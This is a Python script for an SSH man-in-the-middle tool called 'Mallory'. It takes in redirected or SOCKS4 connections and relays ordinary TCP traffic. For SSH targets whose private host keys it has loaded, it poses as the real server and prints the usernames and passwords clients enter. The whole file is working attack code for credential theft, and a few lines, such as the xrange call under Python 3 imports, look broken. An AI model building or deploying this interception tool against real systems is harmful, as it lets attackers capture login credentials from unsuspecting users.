#!/usr/bin/env python

import base64
from binascii import hexlify
import os
import socket
import sys
import traceback
import argparse
import struct
import select
import threading

import paramiko
from paramiko.py3compat import b, u, decodebytes

class MalloryServer:

	def __init__(self, port, use_socks):
		self.port = port
		self.use_socks = use_socks
		self.socket = None
		self.interceptors = []

	def _get_dst(self, conn):
		if self.use_socks:
			return self._get_socks4_dst(conn)
		else:
			return self._get_ipt_orig_dst(conn)

	def _get_ipt_orig_dst(self, conn):
		SO_ORIGINAL_DST = 80
		sockaddr_in = conn.getsockopt(socket.SOL_IP, SO_ORIGINAL_DST, 16)
		(proto, port, a, b, c, d) = struct.unpack('!HHBBBB', sockaddr_in[:8])
		dst = "%d.%d.%d.%d" % (a, b, c, d)
		print('Original destination was: %s:%d' % (dst, port))
		return (dst, port)

	def _get_socks4_dst(self, conn):
		req = conn.recv(8)
		login = ""
		while True:
			d = conn.recv(1)
			if d == b"\x00":
				break
			login += d

		(ver, cmd, port, addr_a, addr_b, addr_c, addr_d) = struct.unpack("!2BH4B", req)
		if not (ver == 0x04 and cmd == 0x01):
			raise IOError("Invalid SOCKS4 request")
		dst = "%d.%d.%d.%d" % (addr_a, addr_b, addr_c, addr_d)
		print('Original destination was: %s:%d (login: %s)' % (dst, port, login))
		reply = struct.pack("!2BH4B", 0, 0x5A, 0, 0, 0, 0, 0)
		conn.send(reply)
		return (dst, port)

	def _bind_socket(self):
		self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		self.socket.bind(('', self.port))

	def _loop(self):
		print('Listening for connection ...')
		self.socket.listen(0)
		client, addr = self.socket.accept()
		client_thread = threading.Thread(target=self._handle_client, args=(client, addr))
		client_thread.start()

	def _handle_client(self, client, src):
		try:
			dst = self._get_dst(client)
			for ior in self.interceptors:
				if ior.want(dst):
					print('[%s] Intercepting connection: %s:%d -> %s:%d' % (ior.__class__.__name__, src[0], src[1], dst[0], dst[1]))
					ior.intercept(client, dst)
					break
		finally:
			client.close()

	def add_interceptor(self, interceptor):
		self.interceptors.append(interceptor)

	def start(self):
		self._bind_socket()
		while True:
			self._loop()

class MalloryInterceptor:
	def want(self, dst):
		pass
	def intercept(self, client, dst):
		pass

class TCPRelay(MalloryInterceptor):
	def want(self, dst):
		return True

	def intercept(self, client, dst):
		target = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		target.connect(dst)
		
		mapping = {}
		mapping[client] = target
		mapping[target] = client
		ss = select.select
		while True:
			input, output, xcept = ss(mapping.values(), [], [])
			for s in input:
				data = s.recv(1024)
				if len(data) == 0:
					target.close()
					client.close()
					return
				else:
					mapping[s].send(data)

class SSHRejectingServer(paramiko.ServerInterface):
	identity = None

	def __init__(self, identity):
		self.identity = identity
		self.event = threading.Event()

	def check_auth_password(self, username, password):
		print("""Auth attempt to '%s' with user '%s' and password '%s'""" % (self.identity, username, password))
		return paramiko.AUTH_FAILED

	def get_allowed_auths(self, username):
		return 'password'


class SSHHostKeyring:
	keys = {}

	def load_keyfile(self, filename):
		key = paramiko.RSAKey(filename=filename)
		fp = key.get_fingerprint()
		print('Read key ' + fmt_fp(u(hexlify(fp))) + ' from "' + filename +'"')
		self.keys[fp] = key

	def get_key(self, fp):
		if fp in self.keys:
			return self.keys[fp]
		else:
			return None

class SSHTargetDatabase:
	hosts = {}

	def get_fp(self, dst):
		if (dst) not in self.hosts:
			fp = self.__get_server_fp(dst)
			self.hosts[dst] = fp

		return self.hosts[dst]

	def __get_server_fp(self, dst):
		client = paramiko.SSHClient()
		# now connect
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.connect(dst)
		except Exception as e:
			print('*** Connect failed: ' + str(e))
			traceback.print_exc()
			return None
		t = paramiko.Transport(sock)
		try:
			t.start_client()
			key = t.get_remote_server_key()
			print('retrieved target fp: ' + fmt_fp(u(hexlify(key.get_fingerprint()))))
			return key.get_fingerprint()
		except paramiko.SSHException:
			print('*** SSH negotiation failed.')
			return None
		finally:
			t.close()
			sock.close()

class SSHInterceptor(MalloryInterceptor):
	def __init__(self, keyring, targets):
		self.keyring = keyring
		self.targets = targets

	def want(self, dst):
		if (dst[1] != 22):
			return False
		# get host key of target
		fp = self.targets.get_fp(dst)
		if self.keyring.get_key(fp):
			return True
		return False

	def intercept(self, client, dst):
		fp = self.targets.get_fp(dst)
		key = self.keyring.get_key(fp)
		if key:
			t = paramiko.Transport(client)
			t.set_gss_host(socket.getfqdn(""))
			try:
				t.load_server_moduli()
			except:
				print('(Failed to load moduli -- gex will be unsupported.)')
				raise
			t.add_server_key(key)
			server = SSHRejectingServer("%s:%d" % (dst[0], dst[1]))
			try:
				t.start_server(server=server)
			except paramiko.SSHException:
				print('*** SSH negotiation failed.')
				return

			# wait for auth
			chan = t.accept(20)
			if chan is None:
				print('*** Timeout waiting for channel request.')

def fmt_fp(fp):
	n = 2
	tokens = [ fp[i:i+n] for i in xrange(0, len(fp), n) ]
	return ':'.join(tokens)


def launch_server():
	parser = argparse.ArgumentParser()
	parser.add_argument("--port", type=int, dest="port", help="listening port")
	parser.add_argument("--socks", action="store_true", help="offer SOCKS4 (default: no)")
	parser.add_argument('keys', metavar='KEYFILE', type=str, nargs='*',
                            help='SSH host key files')
	args = parser.parse_args()

	targetdb = SSHTargetDatabase()
	keyring = SSHHostKeyring()
	for filename in args.keys:
		keyring.load_keyfile(filename)

	print('%u distinct host keys have been loaded into the key ring' % len(keyring.keys))

	mallory = MalloryServer(args.port, args.socks)
	mallory.add_interceptor(SSHInterceptor(keyring, targetdb))
	mallory.add_interceptor(TCPRelay())
	mallory.start()

if __name__ == "__main__":
	#paramiko.util.log_to_file('mallory_server.log')
	launch_server()
